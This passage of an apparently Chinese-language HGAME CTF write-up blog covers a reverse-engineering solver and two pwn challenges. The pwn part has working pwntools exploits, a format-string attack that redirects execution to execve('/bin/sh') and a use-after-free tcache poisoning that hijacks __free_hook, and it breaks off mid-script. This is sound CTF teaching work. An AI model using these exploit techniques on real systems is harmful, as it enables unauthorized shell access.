class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span></span><br></pre></td></tr></table></figure><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>å°†ä¸€ä¸ªæ•°åˆ†å¼€äºŒæ¬¡åŠ å¯†è®°å½•ï¼Œä¸€ä¸ªè®¡ç®—<code>%16</code>çš„ä½™æ•°ï¼Œå¦ä¸€ä¸ªè®¡ç®—<code>/16</code>çš„æ•´æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-1CCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [esp+190h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1C4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  sub_4011A0(<span class="string">&quot;%50s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">2</span> * i] = v5[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    v4[<span class="number">2</span> * i + <span class="number">1</span>] = (v5[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != dword_403000[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401160(Format, v4[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401160(aYesYouAreRight, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">result=[<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    result[<span class="number">2</span>*i]=result[<span class="number">2</span>*i] &amp; <span class="number">0xf</span></span><br><span class="line">    result[<span class="number">2</span>*i+<span class="number">1</span>]=(result[<span class="number">2</span>*i+<span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">    flag[i]=result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><p>è€ƒå¯Ÿæ ˆå¤–çš„æ ¼å¼åŒ–æ¼æ´ï¼Œä¸”<code>read</code>æ¬¡æ•°åªæœ‰ä¸€æ¬¡ï¼Œè¯´æ˜ä¸€æ¬¡åªèƒ½ä¿®æ”¹ä¸€ä¸ªæŒ‡å®šåœ°å€ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/99040/18/33955/52628/63c4b592Fdf5a68c1/c4c2b5bfadb8f836.png" style="zoom: 67%;" /><ul><li>ç¬¬ä¸€æ¬¡éœ€è¦ç”¨æ¥æ³„éœ²+è¿”å›ï¼Œå°†<code>buf</code>å……æ»¡ï¼Œä¼šé€šè¿‡<code>print_str</code>æ³„éœ²å‡ºä¸€ä¸ªæ®‹ç•™çš„æ ˆåœ°å€ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140789/38/32753/51582/63c4b696F25308ff7/31bf55ae390a5057.png" style="zoom:67%;" /><ul><li>ä¸è¦<code>n</code>ï¼Œç»§ç»­åœ¨<code>buf</code>ä¸Šå¸ƒç½®æ ˆè¿”å›åœ°å€ï¼Œä½¿å…¶è¿”å›åˆ°<code>_start</code>ï¼ˆè¿”å›<code>main</code>å’Œ<code>vuln</code>ä¼šæŠ¥é”™ï¼‰ï¼Œé¡ºä¾¿æ³„éœ²å‡º<code>libc</code>ã€‚</li><li>ç”±äº<code>printf(str)</code>æœ€ç¨³å¦¥çš„ä¿®æ”¹æ–¹æ³•æ˜¯ä¸€ä¸ªåœ°å€ä¸­çš„<code>1å­—èŠ‚+2å­—èŠ‚</code>(<code>2+2</code>éœ€è¦çˆ†ç ´)ï¼Œå› æ­¤ä¸éš¾æƒ³åˆ°åŠ«æŒç¨‹åºæ‰§è¡Œæµä¸º<code>one_gadget</code>ï¼Œè€Œè¿”å›åœ°å€<code>__libc_start_main+???</code>ä½œä¸º<code>libc</code>åœ°å€æ˜¾ç„¶å’Œ<code>one_gadget</code>å…·æœ‰æ›´å¥½çš„ç›¸ä¼¼æ€§ï¼Œåœ¨è¿”å›åˆ°<code>__libc_start_main+???</code>æ—¶å¯ä»¥è§‚å¯Ÿåˆ°<code>rdx=0</code>å’Œ<code>r15=0</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><ul><li>ä¸éš¾æƒ³åˆ°ç”¨ç¬¬äºŒä¸ª<code>gadget</code>ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31352</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">256</span>)</span><br><span class="line">stack=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">8</span></span><br><span class="line">log.success(<span class="string">&quot;stack===&gt;&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(p64(stack)*<span class="number">32</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%45$p%4418c%8$hn&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">m1=(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">m2=one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget==&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">log.success(<span class="string">&quot;m1=&quot;</span>+<span class="built_in">hex</span>(m1)+<span class="string">&quot;;m2=&quot;</span>+<span class="built_in">hex</span>(m2))</span><br><span class="line">stack2=stack-<span class="number">224</span></span><br><span class="line">log.success(<span class="string">&quot;stack2==&quot;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line">io.sendafter(<span class="string">&quot;What would you like to let Yukkri say?\n&quot;</span>,p64(stack2+<span class="number">2</span>)+p64(stack2))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;anything else?(Y/n)\n&quot;</span>,<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>(m1)</span><br><span class="line">payload+=<span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(m2-m1)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h3><p><code>libc2.31</code>ä¸‹å¸¸è§„çš„<code>uaf</code>æ¼æ´ã€‚</p><ul><li>addï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size[<span class="number">7</span>]; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;This page has been used.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( size[<span class="number">0</span>] &lt;= <span class="number">0xFF</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v2;</span><br><span class="line">        notes[v0] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);</span><br><span class="line">        note_size[v2] = size[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Too big.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ *&amp;size[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>deleteä¸­å‡ºç°<code>uaf</code>æ¼æ´ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">delete_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">free</span>(notes[v2]);<span class="comment">// uafæ¼æ´</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>editï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, notes[v2], note_size[v2]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>showï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">puts</span>(notes[v2]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·9ä¸ª<code>unsortedbin</code>å¤§å°çš„å †ï¼Œé‡Šæ”¾å‰8ä¸ªï¼Œå…¶ä¸­7ä¸ªè¿›å…¥<code>tcachebin</code>ï¼Œ1ä¸ªè¿›å…¥<code>unsortedbin</code>ï¼Œç¬¬9ä¸ªå †ç”¨äºé¿å…è¢«<code>topchunk</code>å¸æ”¶ã€‚</li><li>æ‰“å°å¾—åˆ°<code>libc</code>åœ°å€ï¼Œè®¡ç®—<code>__free_hook</code>å’Œ<code>system</code>ã€‚</li><li>ä¿®æ”¹ç¬¬6ä¸ªå †çš„<code>fd</code>æŒ‡é’ˆæŒ‡å‘<code>__free_hook</code>ã€‚</li><li>å†ç”³è¯·2ä¸ªå †ï¼ŒåŠ«æŒ<code>__free_hook</code>ä¸º<code>system</code>ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31047</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span 